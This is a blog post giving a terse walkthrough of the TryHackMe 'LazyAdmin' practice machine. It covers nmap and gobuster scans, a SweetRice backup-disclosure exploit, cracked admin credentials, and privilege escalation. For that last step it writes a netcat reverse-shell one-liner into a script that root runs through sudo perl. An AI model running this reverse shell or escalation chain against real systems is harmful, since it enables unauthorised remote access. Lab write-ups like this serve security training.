+++
categories = ["Hugo"]
date = "2020-08-23"
description = "LazyAdmin TryHackMe Writeup"

featuredalt = ""
featuredpath = "date"
linktitle = ""
title = "LazyAdmin TryHackMe Writeup"
slug = "LazyAdmin TryHackMe Writeup"
type = "post"
+++


![LazyAdmin TryHackMe](https://www.sfdcpoint.com/wp-content/uploads/2019/01/Salesforce-Admin-Interview-questions.png)

## Introduction 

Nmap scan 

nmap -sC -sV -oN nmap/initial $ip


```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


gobuster scan 

```
gobuster dir -u $ip -w /usr/share/dirb/wordlists/common.txt

2020/05/19 17:03:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/content (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)

```
scan the /content

```
gobuster dir -u $ip/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

2020/05/19 17:07:27 Starting gobuster
===============================================================
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)

```

search for vuln

searchsploit sweetrice

cat the backup vuln there is the link of mysql backup

read the file there will be a password (encrypted) 

crack from crackstation

then login



username: manager
passwd : Password123


echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.162 5554 >/tmp/f' >/etc/copy.sh

then start the listner on host 5554

start the backup.pl as sudo   {sudo /usr/bin/perl /home/itguy/backup.pl}

cd /root/
cat root.txt
